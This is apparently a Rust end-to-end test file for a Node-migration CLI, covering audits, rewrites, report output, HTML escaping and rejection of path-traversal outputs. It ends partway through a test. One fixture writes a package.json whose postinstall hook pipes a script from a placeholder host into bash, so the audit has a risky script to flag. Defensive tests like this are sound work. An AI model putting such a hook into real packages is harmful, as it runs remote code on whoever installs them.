use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use assert_cmd::cargo::CommandCargoExt;
use frankenengine_node::connector::migration_artifact::{
    event_codes, generate_reference_behavioral_conformance_certificate,
    validate_behavioral_conformance_certificate,
    verify_behavioral_conformance_certificate_signature,
};
use frankenengine_node::migration::{
    migration_runtime_smoke_stderr_sha256_hex, migration_runtime_smoke_stdout_sha256_hex,
};
use frankenengine_verifier_sdk::{
    MIGRATION_EQUIVALENCE_ARTIFACT_PATH, MIGRATION_EQUIVALENCE_SCHEMA_VERSION, SDK_VERSION,
    VerificationVerdict, bundle, create_verifier_sdk,
};
use serde::Serialize;
use sha2::{Digest, Sha256};
use tempfile::TempDir;
use tree_sitter::{Language, Node, Parser as JsParser};

#[path = "golden/mod.rs"]
mod golden;

#[path = "migrate_rewrite_goldens.rs"]
mod migrate_rewrite_goldens;

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|path| path.parent())
        .expect("workspace root")
        .to_path_buf()
}

fn output_artifact_path(test_name: &str, relative_leaf: &str) -> (TempDir, PathBuf, String) {
    let repo = repo_root();
    let artifact_root = repo.join("target/migrate-cli-e2e-output");
    std::fs::create_dir_all(&artifact_root).expect("test output artifact root");
    let temp = tempfile::Builder::new()
        .prefix(test_name)
        .tempdir_in(&artifact_root)
        .expect("test output artifact temp dir");
    let output_path = temp.path().join(relative_leaf);
    let output_arg = output_path
        .strip_prefix(&repo)
        .expect("artifact path must stay below repo root")
        .to_string_lossy()
        .to_string();
    (temp, output_path, output_arg)
}

fn franken_node_command() -> Command {
    Command::cargo_bin("franken-node").expect("franken-node binary")
}

fn fail_test(message: String) -> ! {
    std::panic::panic_any(message)
}

fn fail_command(action: &str, args: &[&str], err: std::io::Error) -> ! {
    fail_test(format!("{action} `{}`: {err}", args.join(" ")))
}

fn run_cli(args: &[&str]) -> Output {
    run_cli_in_dir(args, &repo_root())
}

fn run_cli_in_dir(args: &[&str], current_dir: &Path) -> Output {
    let mut command = franken_node_command();
    command
        .current_dir(current_dir)
        .args(args)
        .output()
        .unwrap_or_else(|err| fail_command("failed running", args, err))
}

fn run_cli_with_wall_timeout(args: &[&str], timeout: Duration, envs: &[(&str, String)]) -> Output {
    let mut command = franken_node_command();
    let mut child = command
        .current_dir(repo_root())
        .args(args)
        .envs(envs.iter().map(|(key, value)| (*key, value)))
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap_or_else(|err| fail_command("failed spawning", args, err));
    let started = Instant::now();

    loop {
        if child
            .try_wait()
            .unwrap_or_else(|err| fail_command("failed polling", args, err))
            .is_some()
        {
            return child
                .wait_with_output()
                .unwrap_or_else(|err| fail_command("failed collecting", args, err));
        }
        if started.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            fail_test(format!(
                "`{}` exceeded external test timeout of {}ms",
                args.join(" "),
                timeout.as_millis()
            ));
        }
        thread::sleep(Duration::from_millis(25));
    }
}

fn len_prefixed_digest_update(hasher: &mut Sha256, bytes: &[u8]) {
    hasher.update(u64::try_from(bytes.len()).unwrap_or(u64::MAX).to_le_bytes());
    hasher.update(bytes);
}

const SDK_MIGRATION_SOURCE_HASH_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:migration-source:v1:";
const SDK_MIGRATION_AST_HASH_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:migration-js-ast:v1:";
const SDK_MIGRATION_LOCKSTEP_VERDICT_HASH_DOMAIN: &[u8] =
    b"frankenengine-verifier-sdk:migration-lockstep-verdict:v1:";

#[derive(Debug, Clone, Serialize)]
struct E2eMigrationSourceSnapshot {
    path: String,
    source_hash: String,
    ast_hash: String,
    source_text: String,
}

#[derive(Debug, Clone, Serialize)]
struct E2eMigrationPreconditionProof {
    rule_id: String,
    source_contains: Vec<String>,
    source_not_contains: Vec<String>,
    target_contains: Vec<String>,
    target_not_contains: Vec<String>,
    passed: bool,
}

#[derive(Debug, Clone, Serialize)]
struct E2eMigrationLockstepWitness {
    lockstep_oracle_id: String,
    fixture_corpus_digest: String,
    proptest_seed: String,
    fixture_cases: u64,
    proptest_cases: u64,
    effect_receipt_equivalence_cases: u64,
    effect_receipt_ids: Vec<String>,
    divergence_count: u64,
    verdict: String,
    lockstep_verdict_hash: String,
}

#[derive(Debug, Clone, Serialize)]
struct E2eMigrationEquivalenceCapsule {
    schema_version: String,
    rule_id: String,
    source: E2eMigrationSourceSnapshot,
    target: E2eMigrationSourceSnapshot,
    precondition: E2eMigrationPreconditionProof,
    lockstep_witness: E2eMigrationLockstepWitness,
}

fn push_sdk_length_prefixed(payload: &mut Vec<u8>, bytes: &[u8]) {
    payload.extend_from_slice(&u64::try_from(bytes.len()).unwrap_or(u64::MAX).to_le_bytes());
    payload.extend_from_slice(bytes);
}

fn sdk_migration_source_hash(source_text: &str) -> String {
    let mut payload = Vec::new();
    push_sdk_length_prefixed(&mut payload, SDK_MIGRATION_SOURCE_HASH_DOMAIN);
    push_sdk_length_prefixed(&mut payload, source_text.as_bytes());
    hex::encode(Sha256::digest(&payload))
}

fn push_sdk_js_ast_node(payload: &mut Vec<u8>, node: Node<'_>) {
    push_sdk_length_prefixed(payload, node.kind().as_bytes());
    payload.push(u8::from(node.is_named()));
    payload.extend_from_slice(
        &u64::try_from(node.start_byte())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    payload.extend_from_slice(
        &u64::try_from(node.end_byte())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    payload.extend_from_slice(
        &u64::try_from(node.child_count())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    payload.extend_from_slice(
        &u64::try_from(node.named_child_count())
            .unwrap_or(u64::MAX)
            .to_le_bytes(),
    );
    for index in 0..node.child_count() {
        let Ok(child_index) = u32::try_from(index) else {
            continue;
        };
        if let Some(child) = node.child(child_index) {
            push_sdk_js_ast_node(payload, child);
        }
    }
}

fn sdk_js_ast_hash(source_text: &str) -> String {
    let mut parser = JsParser::new();
    let language: Language = tree_sitter_javascript::LANGUAGE.into();
    parser
        .set_language(&language)
        .expect("JavaScript parser must be available");
    let tree = parser
        .parse(source_text, None)
        .expect("JavaScript parser must produce a syntax tree");
    assert!(
        !tree.root_node().has_error(),
        "test JavaScript fixture must parse without syntax errors"
    );

    let mut payload = Vec::new();
    push_sdk_length_prefixed(&mut payload, SDK_MIGRATION_AST_HASH_DOMAIN);
    push_sdk_js_ast_node(&mut payload, tree.root_node());
    hex::encode(Sha256::digest(&payload))
}

fn sdk_migration_lockstep_verdict_hash(capsule: &E2eMigrationEquivalenceCapsule) -> String {
    let witness = &capsule.lockstep_witness;
    let canonical = serde_json::json!({
        "schema_version": &capsule.schema_version,
        "rule_id": &capsule.rule_id,
        "source_hash": &capsule.source.source_hash,
        "target_hash": &capsule.target.source_hash,
        "source_ast_hash": &capsule.source.ast_hash,
        "target_ast_hash": &capsule.target.ast_hash,
        "precondition_passed": capsule.precondition.passed,
        "lockstep_oracle_id": &witness.lockstep_oracle_id,
        "fixture_corpus_digest": &witness.fixture_corpus_digest,
        "proptest_seed": &witness.proptest_seed,
        "fixture_cases": witness.fixture_cases,
        "proptest_cases": witness.proptest_cases,
        "effect_receipt_equivalence_cases": witness.effect_receipt_equivalence_cases,
        "effect_receipt_ids": &witness.effect_receipt_ids,
        "divergence_count": witness.divergence_count,
        "verdict": &witness.verdict,
    });
    let canonical_bytes =
        serde_json::to_vec(&canonical).expect("lockstep verdict JSON should serialize");
    let mut payload = Vec::new();
    push_sdk_length_prefixed(&mut payload, SDK_MIGRATION_LOCKSTEP_VERDICT_HASH_DOMAIN);
    push_sdk_length_prefixed(&mut payload, &canonical_bytes);
    hex::encode(Sha256::digest(&payload))
}

fn e2e_migration_equivalence_capsule(
    path: &str,
    source_text: &str,
    target_text: &str,
) -> E2eMigrationEquivalenceCapsule {
    let certificate = generate_reference_behavioral_conformance_certificate();
    let mut capsule = E2eMigrationEquivalenceCapsule {
        schema_version: MIGRATION_EQUIVALENCE_SCHEMA_VERSION.to_string(),
        rule_id: certificate.rule_id.clone(),
        source: E2eMigrationSourceSnapshot {
            path: path.to_string(),
            source_hash: sdk_migration_source_hash(source_text),
            ast_hash: sdk_js_ast_hash(source_text),
            source_text: source_text.to_string(),
        },
        target: E2eMigrationSourceSnapshot {
            path: path.to_string(),
            source_hash: sdk_migration_source_hash(target_text),
            ast_hash: sdk_js_ast_hash(target_text),
            source_text: target_text.to_string(),
        },
        precondition: E2eMigrationPreconditionProof {
            rule_id: certificate.rule_id.clone(),
            source_contains: vec!["require(\"fs\")".to_string()],
            source_not_contains: vec!["import fs from \"node:fs\"".to_string()],
            target_contains: vec![
                "import fs from \"node:fs\"".to_string(),
                "console.log".to_string(),
            ],
            target_not_contains: vec!["require(\"fs\")".to_string()],
            passed: true,
        },
        lockstep_witness: E2eMigrationLockstepWitness {
            lockstep_oracle_id: certificate.differential_witness.lockstep_oracle_id,
            fixture_corpus_digest: certificate.differential_witness.fixture_corpus_digest,
            proptest_seed: certificate.differential_witness.proptest_seed,
            fixture_cases: certificate.differential_witness.fixture_cases,
            proptest_cases: certificate.differential_witness.proptest_cases,
            effect_receipt_equivalence_cases: certificate
                .differential_witness
                .effect_receipt_equivalence_cases,
            effect_receipt_ids: vec!["evt-effect-1".to_string()],
            divergence_count: certificate.differential_witness.divergence_count,
            verdict: "pass".to_string(),
            lockstep_verdict_hash: String::new(),
        },
    };
    capsule.lockstep_witness.lockstep_verdict_hash = sdk_migration_lockstep_verdict_hash(&capsule);
    capsule
}

fn make_sdk_migration_equivalence_bundle(capsule: &E2eMigrationEquivalenceCapsule) -> Vec<u8> {
    let replay_artifact_bytes = b"migration-rewrite-e2e-replay-witness";
    let replay_artifact_path = "artifacts/replay.json".to_string();
    let capsule_artifact_bytes =
        serde_json::to_vec(capsule).expect("migration equivalence capsule serializes");
    let replay_payload_length =
        u64::try_from(replay_artifact_bytes.len()).expect("replay artifact length should fit u64");
    let capsule_payload_length = u64::try_from(capsule_artifact_bytes.len())
        .expect("capsule artifact length should fit u64");

    let mut artifacts = BTreeMap::new();
    artifacts.insert(
        replay_artifact_path.clone(),
        bundle::BundleArtifact {
            media_type: "application/json".to_string(),
            digest: bundle::hash(replay_artifact_bytes),
            bytes_hex: hex::encode(replay_artifact_bytes),
        },
    );
    artifacts.insert(
        MIGRATION_EQUIVALENCE_ARTIFACT_PATH.to_string(),
        bundle::BundleArtifact {
            media_type: "application/vnd.franken-node.migration-equivalence+json".to_string(),
            digest: bundle::hash(&capsule_artifact_bytes),
            bytes_hex: hex::encode(&capsule_artifact_bytes),
        },
    );

    let mut replay_bundle = bundle::ReplayBundle {
        header: bundle::BundleHeader {
            hash_algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
            payload_length_bytes: replay_payload_length.saturating_add(capsule_payload_length),
            chunk_count: 2,
        },
        schema_version: bundle::REPLAY_BUNDLE_SCHEMA_VERSION.to_string(),
        sdk_version: SDK_VERSION.to_string(),
        bundle_id: "bundle-migcert-rewrite-e2e".to_string(),
        incident_id: "incident-migcert-rewrite-e2e".to_string(),
        created_at: "2026-06-15T00:00:00Z".to_string(),
        policy_version: "policy.migration-cert.v1".to_string(),
        verifier_identity: "verifier://migration-e2e".to_string(),
        timeline: vec![
            bundle::TimelineEvent {
                sequence_number: 1,
                event_id: "evt-start".to_string(),
                timestamp: "2026-06-15T00:00:01Z".to_string(),
                event_type: "verification.started".to_string(),
                payload: serde_json::json!({"phase": "migration_rewrite_equivalence"}),
                state_snapshot: serde_json::json!({"step": 1}),
                causal_parent: None,
                policy_version: "policy.migration-cert.v1".to_string(),
            },
            bundle::TimelineEvent {
                sequence_number: 2,
                event_id: "evt-effect-1".to_string(),
                timestamp: "2026-06-15T00:00:02Z".to_string(),
                event_type: bundle::EFFECT_RECEIPT_EVENT_TYPE.to_string(),
                payload: serde_json::json!({"effect": "migrate_rewrite", "result": "equivalent"}),
                state_snapshot: serde_json::json!({"step": 2}),
                causal_parent: Some(1),
                policy_version: "policy.migration-cert.v1".to_string(),
            },
        ],
        initial_state_snapshot: serde_json::json!({"migration_certificate": true}),
        evidence_refs: vec!["evidence://migration-cert/rewrite-e2e".to_string()],
        artifacts,
        chunks: vec![
            bundle::BundleChunk {
                chunk_index: 0,
                total_chunks: 2,
                artifact_path: replay_artifact_path,
                payload_length_bytes: replay_payload_length,
                payload_digest: bundle::hash(replay_artifact_bytes),
            },
            bundle::BundleChunk {
                chunk_index: 1,
                total_chunks: 2,
                artifact_path: MIGRATION_EQUIVALENCE_ARTIFACT_PATH.to_string(),
                payload_length_bytes: capsule_payload_length,
                payload_digest: bundle::hash(&capsule_artifact_bytes),
            },
        ],
        metadata: BTreeMap::from([(
            "artifact_kind".to_string(),
            "migration_equivalence".to_string(),
        )]),
        integrity_hash: String::new(),
        signature: bundle::BundleSignature {
            algorithm: bundle::REPLAY_BUNDLE_HASH_ALGORITHM.to_string(),
            signature_hex: String::new(),
        },
    };
    bundle::seal(&mut replay_bundle).expect("migration equivalence bundle seals");
    bundle::serialize(&replay_bundle).expect("migration equivalence bundle serializes")
}

fn log_phase(test_name: &str, phase: &str, detail: serde_json::Value) {
    eprintln!(
        "{}",
        serde_json::to_string(&serde_json::json!({
            "suite": "migrate_cli_e2e",
            "test": test_name,
            "phase": phase,
            "detail": detail,
        }))
        .expect("structured test log serializes")
    );
}

fn parse_json_stdout(output: &Output, label: &str) -> serde_json::Value {
    serde_json::from_slice(&output.stdout).unwrap_or_else(|err| {
        fail_test(format!(
            "{label} stdout must be JSON: {err}\nstdout:\n{}\nstderr:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        ))
    })
}

fn write_basic_rewrite_project(project_path: &Path) {
    std::fs::create_dir_all(project_path).expect("project dir");
    std::fs::write(
        project_path.join("index.js"),
        "const fs = require(\"fs\");\nconsole.log(fs.existsSync(\"package.json\"));\n",
    )
    .expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");
}

fn write_risky_report_project(project_path: &Path) {
    std::fs::create_dir_all(project_path).expect("project dir");
    std::fs::write(
        project_path.join("index.js"),
        "const fs = require(\"fs\");\nconsole.log(fs.existsSync(\"package.json\"));\n",
    )
    .expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo-report",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash"
  }
}
"#,
    )
    .expect("write risky package manifest");
}

#[test]
fn migration_demo_pipeline_runs_live_migrate_commands_end_to_end() {
    let test_name = "migration_demo_pipeline_runs_live_migrate_commands_end_to_end";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");
    std::fs::write(
        project_path.join("index.js"),
        "console.log(JSON.stringify({ demo: 'migration-singularity', ok: true }));\n",
    )
    .expect("write app entrypoint");
    std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "migration-singularity-e2e",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  }
}
"#,
    )
    .expect("write package manifest");
    log_phase(
        test_name,
        "project_created",
        serde_json::json!({"project_path": project_path.display().to_string()}),
    );

    let project_arg = project_path.to_string_lossy().to_string();
    let audit_output = run_cli(&["migrate", "audit", &project_arg, "--format", "json"]);
    assert!(
        audit_output.status.success(),
        "migrate audit failed: stdout={} stderr={}",
        String::from_utf8_lossy(&audit_output.stdout),
        String::from_utf8_lossy(&audit_output.stderr)
    );
    let audit = parse_json_stdout(&audit_output, "migrate audit --format json");
    assert_eq!(audit["schema_version"], serde_json::json!("1.0.0"));
    assert_eq!(audit["summary"]["package_manifests"], serde_json::json!(1));
    assert_eq!(
        audit["summary"]["lockfiles"],
        serde_json::json!(["package-lock.json"])
    );
    log_phase(
        test_name,
        "audit_checked",
        serde_json::json!({
            "files_scanned": audit["summary"]["files_scanned"],
            "findings": audit["findings"].as_array().map_or(0, |items| items.len()),
        }),
    );

    let (_rollback_temp, rollback_plan_path, rollback_arg) =
        output_artifact_path(test_name, "rollback/plan.json");
    let rewrite_output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--json",
        "--emit-rollback",
        &rollback_arg,
    ]);
    assert!(
        rewrite_output.status.success(),
        "migrate rewrite --apply failed: stdout={} stderr={}",
        String::from_utf8_lossy(&rewrite_output.stdout),
        String::from_utf8_lossy(&rewrite_output.stderr)
    );
    let rewrite = parse_json_stdout(&rewrite_output, "migrate rewrite --apply --json");
    assert_eq!(rewrite["apply_mode"], serde_json::json!(true));
    assert_eq!(rewrite["rewrites_applied"], serde_json::json!(1));
    assert!(
        String::from_utf8_lossy(&rewrite_output.stderr)
            .contains("migration rollback artifact written:"),
        "rewrite command must emit rollback artifact status on stderr"
    );
    let rollback_json =
        std::fs::read_to_string(&rollback_plan_path).expect("rollback plan should be written");
    let rollback: serde_json::Value = serde_json::from_str(&rollback_json)
        .unwrap_or_else(|err| fail_test(format!("invalid rollback json: {err}\n{rollback_json}")));
    assert_eq!(rollback["apply_mode"], serde_json::json!(true));
    assert_eq!(rollback["entry_count"], serde_json::json!(1));

    let rewritten_package =
        std::fs::read_to_string(project_path.join("package.json")).expect("read package manifest");
    let rewritten_manifest: serde_json::Value = serde_json::from_str(&rewritten_package)
        .unwrap_or_else(|err| fail_test(format!("invalid rewritten package json: {err}")));
    assert_eq!(
        rewritten_manifest["engines"]["node"],
        serde_json::json!(">=20 <23")
    );
    assert_eq!(
        rewritten_manifest["scripts"]["start"],
        serde_json::json!("franken-node index.js")
    );
    log_phase(
        test_name,
        "rewrite_checked",
        serde_json::json!({
            "rollback_entries": rollback["entry_count"],
            "rewrites_applied": rewrite["rewrites_applied"],
        }),
    );

    let validate_output = run_cli(&["migrate", "validate", &project_arg, "--format", "json"]);
    assert!(
        validate_output.status.success(),
        "migrate validate failed: stdout={} stderr={}",
        String::from_utf8_lossy(&validate_output.stdout),
        String::from_utf8_lossy(&validate_output.stderr)
    );
    let validate = parse_json_stdout(&validate_output, "migrate validate --format json");
    assert_eq!(validate["status"], serde_json::json!("pass"));
    let checks = validate
        .get("checks")
        .and_then(serde_json::Value::as_array)
        .unwrap_or_else(|| fail_test(format!("validation checks missing: {validate:#?}")));
    let runtime_smoke = checks
        .iter()
        .find(|check| check.get("id").is_some_and(|id| id == "mig-validate-005"))
        .unwrap_or_else(|| {
            fail_test(format!(
                "runtime smoke validation check missing: {checks:#?}"
            ))
        });
    assert_eq!(
        runtime_smoke.get("passed"),
        Some(&serde_json::json!(true)),
        "runtime smoke validation check must pass"
    );
    assert!(
        runtime_smoke
            .get("message")
            .and_then(serde_json::Value::as_str)
            .is_some_and(|message| message.contains("runtime smoke test passed")
                && message.contains("receipt_round_trip=true")),
        "runtime smoke check must prove the transformed project was executed: {runtime_smoke:#?}"
    );
    log_phase(
        test_name,
        "validate_checked",
        serde_json::json!({"runtime_smoke": runtime_smoke.get("message")}),
    );
}

#[test]
fn migrate_report_json_stdout_composes_audit_rewrite_validate_sections() {
    let test_name = "migrate_report_json_stdout_composes_audit_rewrite_validate_sections";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_risky_report_project(&project_path);
    let original_manifest =
        std::fs::read_to_string(project_path.join("package.json")).expect("read package manifest");
    log_phase(
        test_name,
        "fixtures_written",
        serde_json::json!({"project_path": project_path.display().to_string()}),
    );

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate-report", &project_arg, "--format", "json"]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({
            "success": output.status.success(),
            "status": output.status.code(),
            "stdout_len": output.stdout.len(),
            "stderr_len": output.stderr.len(),
        }),
    );
    assert!(
        output.status.success(),
        "migrate-report --format json should produce a report even when validation is no-go: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let payload = parse_json_stdout(&output, "migrate-report --format json");
    log_phase(
        test_name,
        "stdout_json_parsed",
        serde_json::json!({
            "schema_version": payload["schema_version"],
            "go_no_go": payload["executive_summary"]["go_no_go"],
        }),
    );
    assert_eq!(
        payload["schema_version"],
        serde_json::json!("franken-node/migrate-report/v1")
    );
    assert_eq!(
        payload["executive_summary"]["go_no_go"],
        serde_json::json!("no_go")
    );
    assert!(
        payload["executive_summary"]["risk_score"]
            .as_u64()
            .is_some_and(|score| score > 0),
        "risk score should reflect the risky fixture: {payload:#?}"
    );
    assert_eq!(
        payload["api_inventory"]["package_manifests"],
        serde_json::json!(1)
    );
    assert_eq!(
        payload["audit"]["summary"]["risky_scripts"],
        serde_json::json!(1)
    );
    assert_eq!(
        payload["rewrite_suggestions"]["apply_mode"],
        serde_json::json!(false)
    );
    assert_eq!(payload["validation"]["status"], serde_json::json!("fail"));
    let phase_names = payload["rollout_plan"]["phases"]
        .as_array()
        .expect("rollout phases array")
        .iter()
        .map(|phase| phase["name"].as_str().unwrap_or_default())
        .collect::<Vec<_>>();
    assert_eq!(phase_names, vec!["audit", "rewrite", "validate", "rollout"]);
    assert_eq!(
        std::fs::read_to_string(project_path.join("package.json")).expect("read package manifest"),
        original_manifest,
        "migrate-report must not apply rewrites while producing the report"
    );
}

#[test]
fn migrate_report_html_output_writes_escaped_report_file() {
    let test_name = "migrate_report_html_output_writes_escaped_report_file";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project<demo&report>");
    write_risky_report_project(&project_path);
    let (_output_temp, output_path, output_arg) =
        output_artifact_path(test_name, "reports/migration-report.html");
    let project_arg = project_path.to_string_lossy().to_string();
    log_phase(
        test_name,
        "fixtures_written",
        serde_json::json!({
            "project_path": project_path.display().to_string(),
            "output_path": output_path.display().to_string(),
        }),
    );

    let output = run_cli(&[
        "migrate-report",
        &project_arg,
        "--format",
        "html",
        "--output",
        &output_arg,
    ]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({
            "success": output.status.success(),
            "status": output.status.code(),
            "stdout_len": output.stdout.len(),
            "stderr_len": output.stderr.len(),
        }),
    );
    assert!(
        output.status.success(),
        "migrate-report --format html --output failed: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        output.stdout.is_empty(),
        "HTML --output mode must not also emit stdout: {}",
        String::from_utf8_lossy(&output.stdout)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("migration report written:") && stderr.contains(&output_arg),
        "stderr should identify the written HTML report: {stderr}"
    );
    let html = std::fs::read_to_string(&output_path).expect("HTML report should be written");
    log_phase(
        test_name,
        "html_artifact_checked",
        serde_json::json!({"bytes": html.len()}),
    );
    assert!(html.contains("<section id=\"executive-summary\">"));
    assert!(html.contains("<section id=\"rollout-plan\">"));
    assert!(html.contains("go_no_go=no_go"));
    assert!(
        html.contains("project&lt;demo&amp;report&gt;"),
        "project path should be HTML-escaped: {html}"
    );
    assert!(
        !html.contains("project<demo&report>"),
        "HTML report must not contain the raw unsafe project path: {html}"
    );
}

#[test]
fn migration_output_paths_reject_unsafe_values_before_writing() {
    let test_name = "migration_output_paths_reject_unsafe_values_before_writing";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_risky_report_project(&project_path);
    let project_arg = project_path.to_string_lossy().to_string();
    let absolute_output = temp
        .path()
        .join("forbidden/migration-report.html")
        .to_string_lossy()
        .to_string();
    let cases: Vec<(&str, Vec<String>)> = vec![
        (
            "migrate-report absolute output",
            vec![
                "migrate-report".to_string(),
                project_arg.clone(),
                "--format".to_string(),
                "html".to_string(),
                "--output".to_string(),
                absolute_output,
            ],
        ),
        (
            "migrate-report traversal alias output",
            vec![
                "migrate-report".to_string(),
                project_arg.clone(),
                "--out".to_string(),
                "../escape/migration-report.json".to_string(),
            ],
        ),
        (
            "migrate audit backslash output",
            vec![
                "migrate".to_string(),
                "audit".to_string(),
                project_arg.clone(),
                "--format".to_string(),
                "sarif".to_string(),
                "--out".to_string(),
                "reports\\migration-audit.sarif".to_string(),
            ],
        ),
        (
            "migrate rewrite traversal rollback output",
            vec![
                "migrate".to_string(),
                "rewrite".to_string(),
                project_arg,
                "--emit-rollback".to_string(),
                "../escape/rollback.json".to_string(),
            ],
        ),
    ];

    for (label, args) in cases {
        let refs = args.iter().map(String::as_str).collect::<Vec<_>>();
        let output = run_cli_in_dir(&refs, temp.path());
        let stderr = String::from_utf8_lossy(&output.stderr);
        log_phase(
            test_name,
            "rejection_checked",
            serde_json::json!({
                "case": label,
                "success": output.status.success(),
                "stderr": stderr,
            }),
        );
        assert!(
            !output.status.success(),
            "{label} should fail closed before writing: stdout={} stderr={}",
            String::from_utf8_lossy(&output.stdout),
            stderr
        );
        assert!(
            stderr.contains("Invalid content path"),
            "{label} should report content-path validation failure: {stderr}"
        );
    }
}

#[test]
fn migrate_audit_sarif_out_writes_artifact_without_stdout_payload() {
    let test_name = "migrate_audit_sarif_out_writes_artifact_without_stdout_payload";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_risky_report_project(&project_path);

    let (_out_temp, out_path, out_arg) =
        output_artifact_path(test_name, "reports/migration-audit.sarif");
    let project_arg = project_path.to_string_lossy().to_string();
    log_phase(
        test_name,
        "fixtures_written",
        serde_json::json!({
            "project_path": project_path.display().to_string(),
            "sarif_path": out_path.display().to_string(),
        }),
    );

    let output = run_cli(&[
        "migrate",
        "audit",
        &project_arg,
        "--format",
        "sarif",
        "--out",
        &out_arg,
    ]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({
            "success": output.status.success(),
            "status": output.status.code(),
            "stdout_len": output.stdout.len(),
            "stderr_len": output.stderr.len(),
        }),
    );
    assert!(
        output.status.success(),
        "migrate audit --format sarif --out failed: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        output.stdout.is_empty(),
        "SARIF --out mode must not also emit a stdout payload: {}",
        String::from_utf8_lossy(&output.stdout)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("migration audit report written:"),
        "SARIF --out mode must log the artifact path on stderr: {stderr}"
    );
    assert!(
        stderr.contains(&out_arg),
        "stderr should include the concrete SARIF path: {stderr}"
    );

    let sarif_raw = std::fs::read_to_string(&out_path).expect("SARIF report should be written");
    let sarif: serde_json::Value = serde_json::from_str(&sarif_raw)
        .unwrap_or_else(|err| fail_test(format!("SARIF report must be JSON: {err}\n{sarif_raw}")));
    log_phase(
        test_name,
        "sarif_artifact_parsed",
        serde_json::json!({
            "bytes": sarif_raw.len(),
            "result_count": sarif["runs"][0]["results"].as_array().map_or(0, Vec::len),
        }),
    );
    assert_eq!(sarif["version"], serde_json::json!("2.1.0"));
    assert_eq!(
        sarif["$schema"],
        serde_json::json!("https://json.schemastore.org/sarif-2.1.0.json")
    );
    assert_eq!(
        sarif["runs"][0]["tool"]["driver"]["name"],
        serde_json::json!("franken-node migrate audit")
    );
    let results = sarif["runs"][0]["results"]
        .as_array()
        .expect("SARIF results must be an array");
    assert!(
        results.iter().any(|result| {
            result["ruleId"]
                .as_str()
                .is_some_and(|rule_id| rule_id.starts_with("mig-audit-"))
                && result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
                    == serde_json::json!("package.json")
        }),
        "SARIF results must include the real package.json audit finding: {sarif:#?}"
    );
}

#[test]
fn migrate_audit_json_out_writes_artifact_without_stdout_payload() {
    let test_name = "migrate_audit_json_out_writes_artifact_without_stdout_payload";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_risky_report_project(&project_path);

    let (_out_temp, out_path, out_arg) =
        output_artifact_path(test_name, "reports/migration-audit.json");
    let project_arg = project_path.to_string_lossy().to_string();
    log_phase(
        test_name,
        "fixtures_written",
        serde_json::json!({
            "project_path": project_path.display().to_string(),
            "json_path": out_path.display().to_string(),
        }),
    );

    let output = run_cli(&[
        "migrate",
        "audit",
        &project_arg,
        "--format",
        "json",
        "--out",
        &out_arg,
    ]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({
            "success": output.status.success(),
            "status": output.status.code(),
            "stdout_len": output.stdout.len(),
            "stderr_len": output.stderr.len(),
        }),
    );
    assert!(
        output.status.success(),
        "migrate audit --format json --out failed: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        output.stdout.is_empty(),
        "JSON --out mode must not also emit a stdout payload: {}",
        String::from_utf8_lossy(&output.stdout)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("migration audit report written:"),
        "JSON --out mode must log the artifact path on stderr: {stderr}"
    );
    assert!(
        stderr.contains(&out_arg),
        "stderr should include the concrete JSON path: {stderr}"
    );

    let report_raw = std::fs::read_to_string(&out_path).expect("JSON report should be written");
    let report: serde_json::Value = serde_json::from_str(&report_raw)
        .unwrap_or_else(|err| fail_test(format!("audit report must be JSON: {err}\n{report_raw}")));
    log_phase(
        test_name,
        "json_artifact_parsed",
        serde_json::json!({
            "bytes": report_raw.len(),
            "finding_count": report["findings"].as_array().map_or(0, Vec::len),
        }),
    );
    assert_eq!(report["schema_version"], serde_json::json!("1.0.0"));
